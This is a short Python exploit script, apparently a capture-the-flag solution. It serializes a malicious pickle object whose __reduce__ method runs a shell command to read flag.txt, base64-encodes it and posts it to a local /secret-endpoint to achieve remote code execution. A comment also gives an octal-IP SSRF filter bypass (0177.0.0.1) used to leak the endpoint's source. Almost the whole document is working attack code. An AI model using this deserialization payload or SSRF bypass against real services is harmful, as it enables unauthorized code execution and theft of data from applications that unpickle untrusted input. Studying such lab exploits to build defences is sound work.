import base64
import pickle
import requests
import subprocess

# After sending a payload to bypass SSRF filter, we see in the source code leaked the mention of /secret-endpoint
# payload (among others) : http://0177.0.0.1/source-code

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', 'flag.txt'],))

# Serialize the malicious object
payload = pickle.dumps(RCE())

# Encode the payload in base64 to make it web-safe
encoded_payload = base64.urlsafe_b64encode(payload).decode()

# Send the payload to the /secret-endpoint endpoint
response = requests.post('http://localhost:8080/secret-endpoint', json={'data': encoded_payload})

# Print the server's response, which should contain the flag
print(response.json())
